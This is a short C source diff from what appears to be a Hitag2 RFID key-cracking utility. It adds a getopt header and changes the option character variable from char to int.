@@ -49,6 +49,7 @@
 #include <inttypes.h>
 #include <math.h>
 #include <pthread.h>
+#include <getopt.h>
 #include "ht2crackutils.h"
 
 /* you could have more than 32 traces, but you shouldn't really need
@@ -774,7 +775,7 @@ int main(int argc, char *argv[]) {
     uint64_t revkey;
     uint64_t foundkey;
     int tot_nRaR = 0;
-    char c;
+    int c;
     char *uidstr = NULL;
     char *noncefilestr = NULL;
 
